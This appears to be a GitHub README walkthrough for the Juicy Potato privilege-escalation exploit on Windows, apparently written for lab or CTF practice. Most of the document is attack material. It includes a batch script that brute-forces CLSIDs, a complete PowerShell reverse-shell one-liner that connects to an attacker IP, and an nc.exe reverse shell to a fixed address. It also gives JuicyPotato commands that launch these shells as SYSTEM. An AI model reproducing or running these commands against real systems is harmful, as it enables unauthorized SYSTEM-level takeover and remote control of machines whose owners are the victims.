# Juicy-Potato
Juicy Potato is a Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM. 

# Exploitation
First Check that you've SeImpersonatePrivilege Enabled

whoami /priv

![OnPaste 20220606-195812](https://user-images.githubusercontent.com/106917304/172181384-a233e095-62a2-4088-90f9-40312107bdbc.png)



With systeminfo we can see the target OS name

![OnPaste 20220606-185951](https://user-images.githubusercontent.com/106917304/172170491-77cc6851-f294-4156-9076-0a917bd08776.png)


Traget Arch

![OnPaste 20220606-190251](https://user-images.githubusercontent.com/106917304/172170739-bddac064-d18f-4f70-95fe-8ed3c94c7e7a.png)


Now we gonna get CLSID for our target machine

Resource: https://github.com/ohpe/juicy-potato/tree/master/CLSID <link>

Here my traget is Windows 7 Professional i can go for Windows 7 Enterprise, copy all the CLSID from CLSID.list file.

Open your favourite editor and paste all the CLSID and name the file CLSID.list.

Our target machine is x32-bit arch. Grab the Juicy Potato binary for 32-bit os.

Resource: https://github.com/k4sth4/Juicy-Potato <link>

We gonna make a test.bat file which gonna help you to execute the jp32.exe and find you a valid CLSID for attack.

Content of our test.bat file

```markdown

@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION
FOR /F %%i IN (C:\\Users\\Bob\Desktop\\CLSID.list) DO (
echo %%i !port!
C:\\Users\\Bob\\Desktop\\jp32.exe -z -l !port! -c %%i >> result.log
set RET=!ERRORLEVEL!
:: echo !RET!
if "!RET!" == "1" set /a port=port+1
)

```
# Changes to Make
Note: C:\\Users\\Bob\\Desktop\\CLSID.list and C:\\Users\\Bob\\Desktop\\jp32.exe are the place where we gonna upload our CLSID.list file and jp32.exe (juicy potato 32-bit).


# Using Powershell
Next we gonna create shell.bat file for our reverse ahell.

```markdown

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.x.x',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

# Changes to make
NOTE: '10.10.x.x',1234 is the attacker IP and listening port for our reverse shell.



# Using msfvenom or nc.exe binary
generate a shell.exe binary using msfvenom.


Now upload jp32.exe, test.bat, CLSID.list, shell.bat or shell.exe / nc.exe to the user Desktop (same path that we used in our test.bat).

![OnPaste 20220606-192729](https://user-images.githubusercontent.com/106917304/172175237-70da4fdd-2e92-447e-a23d-622692e8b732.png)


Now execute the test.bat
        
        powershell Start-Process c:\Users\Bob\Desktop\test.bat  (if not in powershell)                                                           
        Start-Process c:\Users\Bob\Desktop\test.bat             (if in powershell) 
        
 Now wait for 5-mins you will see result.log file is created type the file you gonna see bunch of CLSID.
 
 ![OnPaste 20220606-193222](https://user-images.githubusercontent.com/106917304/172176176-c227b6c8-dd0b-4d31-9f75-f04a4dabb570.png)

We're insterested in SYSTEM CLSID. Grab one of SYSTEM CLSID.

Now we've found valid CLSID for SYSTEM we can use that CLSID and get system shell.

# Reverse Shell

# Using Powershell shell.bat

```markdown

c:\\Users\\Bob\\Desktop\\JuicyPotato.exe -l 1234 -p c:\\Users\\Bob\\Desktop\\shell.bat -t * -c {c980e4c2-c178-4572-935d-a8a429884806} 

```

# Using nc.exe

```markdown

c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\nc.exe -e cmd.exe 192.168.49.154 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}

```

# Using shell.exe 

```markdown

c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\shell.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

```

![OnPaste 20220606-195312](https://user-images.githubusercontent.com/106917304/172180304-91e48267-0a99-43cd-bd33-0f13c36c90d9.png)

We're now SYSTEM.

![OnPaste 20220606-195431](https://user-images.githubusercontent.com/106917304/172180726-4bdb1672-1a35-4e06-8458-a873b49c6926.png)


